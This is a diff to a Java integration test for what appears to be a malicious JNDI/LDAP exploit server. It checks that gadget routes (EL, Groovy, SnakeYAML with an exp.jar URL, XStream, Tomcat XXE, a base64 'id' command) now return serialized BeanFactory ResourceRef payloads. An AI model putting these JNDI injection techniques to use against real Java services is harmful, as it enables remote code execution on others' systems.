@@ -96,9 +96,9 @@ public class LdapServerIntegrationTest {
                 serverLog.toString("UTF-8").contains("无该内存马类型"));
     }
 
-    // #8: BeanFactory 系 12 类路由直返 Reference 属性，不依赖 javaSerializedData 信任。
+    // BeanFactory 系 12 类路由默认序列化投递（序列化 ResourceRef），目标反序列化得到真 ResourceRef 才能命中工厂。
     @Test
-    public void beanFactoryRoutesReturnDirectReference() throws Exception {
+    public void beanFactoryRoutesReturnSerializedReference() throws Exception {
         String[] routes = {
                 "EL/id", "groovyBytomcat/id", "snakeyaml/http://127.0.0.1/exp.jar",
                 "XStream/id", "mvel/id", "BeanShell2/id",
@@ -110,40 +110,42 @@ public class LdapServerIntegrationTest {
             for (String route : routes) {
                 SearchResultEntry entry = conn.searchForEntry(route, SearchScope.BASE, "(objectClass=*)");
                 Assert.assertNotNull(route, entry);
-                Assert.assertNotNull(route + " 应含 javaClassName", entry.getAttributeValue("javaClassName"));
-                Assert.assertNotNull(route + " 应含 javaFactory", entry.getAttributeValue("javaFactory"));
-                String[] addrs = entry.getAttributeValues("javaReferenceAddress");
-                Assert.assertNotNull(route + " 应含 javaReferenceAddress", addrs);
-                Assert.assertTrue(route + " refAddr 应按序编码: " + addrs[0], addrs[0].startsWith("#0#"));
-                Assert.assertNull(route + " 不应含 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
+                byte[] ser = entry.getAttributeValueBytes("javaSerializedData");
+                Assert.assertNotNull(route + " 应含 javaSerializedData", ser);
+                Assert.assertTrue(route + " 应为合法 Java 序列化流",
+                        ser.length > 4 && (ser[0] & 0xFF) == 0xAC && (ser[1] & 0xFF) == 0xED);
+                Assert.assertTrue(route + " 反序列化应为 Reference", deserialize(ser) instanceof javax.naming.Reference);
+                Assert.assertNull(route + " 默认不应属性直返", entry.getAttributeValues("javaReferenceAddress"));
             }
         }
     }
 
-    // #8: --force-serialize 回退为序列化输出（旧行为对照）。
+    // --ref-attrs 回退属性直返（仅限接受裸 Reference 的工厂，如 MemoryUserDatabaseFactory）。
     @Test
-    public void forceSerializeFallsBackToSerializedData() throws Exception {
-        config.forceSerialize = true;
+    public void refAttrsReturnsDirectReference() throws Exception {
+        config.refAttrs = true;
         try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
-            SearchResultEntry entry = conn.searchForEntry("EL/id", SearchScope.BASE, "(objectClass=*)");
+            SearchResultEntry entry = conn.searchForEntry("tomcat_xxe/http://127.0.0.1/xxe.xml", SearchScope.BASE, "(objectClass=*)");
             Assert.assertNotNull(entry);
-            Assert.assertNotNull("force-serialize 应输出 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
-            Assert.assertNull("force-serialize 不应直返 Reference", entry.getAttributeValue("javaReferenceAddress"));
+            Assert.assertNotNull("ref-attrs 应直返 javaReferenceAddress", entry.getAttributeValues("javaReferenceAddress"));
+            Assert.assertNull("ref-attrs 不应输出 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
         } finally {
-            config.forceSerialize = false;
+            config.refAttrs = false;
         }
     }
 
-    // #5: ELjakarta 路由走 RefFactory 直返（jakarta 命名空间类名）。
+    // #5: ELjakarta 路由默认序列化投递（jakarta 命名空间类名在序列化 ResourceRef 内）。
     @Test
-    public void elJakartaRouteReturnsDirectReference() throws Exception {
+    public void elJakartaRouteReturnsSerializedReference() throws Exception {
         try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
             SearchResultEntry entry = conn.searchForEntry("ELjakarta/base64/aWQ=", SearchScope.BASE, "(objectClass=*)");
             Assert.assertNotNull(entry);
-            Assert.assertEquals("jakarta.el.ELProcessor", entry.getAttributeValue("javaClassName"));
-            Assert.assertEquals("org.apache.naming.factory.BeanFactory", entry.getAttributeValue("javaFactory"));
-            Assert.assertNotNull(entry.getAttributeValues("javaReferenceAddress"));
-            Assert.assertNull(entry.getAttributeValue("javaSerializedData"));
+            byte[] ser = entry.getAttributeValueBytes("javaSerializedData");
+            Assert.assertNotNull("ELjakarta 应含 javaSerializedData", ser);
+            javax.naming.Reference ref = (javax.naming.Reference) deserialize(ser);
+            Assert.assertEquals("jakarta.el.ELProcessor", ref.getClassName());
+            Assert.assertEquals("org.apache.naming.factory.BeanFactory", ref.getFactoryClassName());
+            Assert.assertNull(entry.getAttributeValues("javaReferenceAddress"));
         }
     }
 
@@ -168,6 +170,12 @@ public class LdapServerIntegrationTest {
     private static int freePort() throws Exception {
         try (ServerSocket socket = new ServerSocket(0)) {
             return socket.getLocalPort();
+        }
+    }
+
+    private static Object deserialize(byte[] bytes) throws Exception {
+        try (java.io.ObjectInputStream ois = new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(bytes))) {
+            return ois.readObject();
         }
     }
 }
